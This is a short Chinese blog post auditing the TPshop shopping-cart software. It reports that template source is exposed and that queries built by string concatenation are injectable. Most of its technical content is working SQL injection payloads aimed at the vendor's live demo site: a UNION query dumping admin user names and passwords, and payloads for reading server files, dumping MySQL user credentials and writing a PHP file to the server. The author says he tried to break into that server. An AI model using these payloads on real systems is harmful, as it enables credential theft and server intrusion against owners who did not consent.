---
title:  tpshop代码审计--续
---
### 商城这股浪潮不是过去了好久了吗?为什么还会有这种程序的出现  

<!--more--> 

**问题1**  

模版代码保存在根目录下的Template目录下,并且官网的demo也没有做出访问限制,就是说代码随便看......  

**问题2**  

好多查询都是字符串拼接放入where里,导致全是注入点  

顺带记录一下失败的查询:在搜索控制器中发现注入点,测试后发现不是直接输出,于是在上一个注入点中构造一个带有下一个注入语句的查询结果,结果是失败了,因为下一个查询是做比对用的,也没有直接输出  

算了,已经不想再找问题了,全是问题  

注入也终于成功了一次,注入点是文章id:  

```
http://demo2.tp-shop.cn/index.php/Home/Article/detail/article_id/123456789 )
UNION ALL
SELECT `user_name`,2,`user_name`,
`password`,`user_name`,`user_name`,`user_name`,`user_name`,
`user_name`,`user_name`,`user_name`,`user_name`,`user_name`,
`user_name`,`user_name`,`user_name`, `user_name` FROM tp_admin
-- hack
```

感觉这个网站就算是给安全新手练手都觉得太简单了.  

**后记:**  
代码全都是漏洞,所以想着利用demo进去服务器看看  
通过代码审计找到sql注入漏洞 然后根据注入试图提权,用了各种方法,发现用户不是root,没有写入与读取权限,失败  

```
/*select 1,2,3,load_file(char(69,58,92,112)),5,6,7,8,9,10,11,12,13,14,15,16,17文件读取 十六进制或char(十进制)
/*select 1,2,3,user,password,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.user用户查看
#UNION 
SELECT '<? echo 1; ?>',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 INTO OUTFILE "xxxx/123.php"文件写入 get传入url会删除'后的代码 测试时是post
```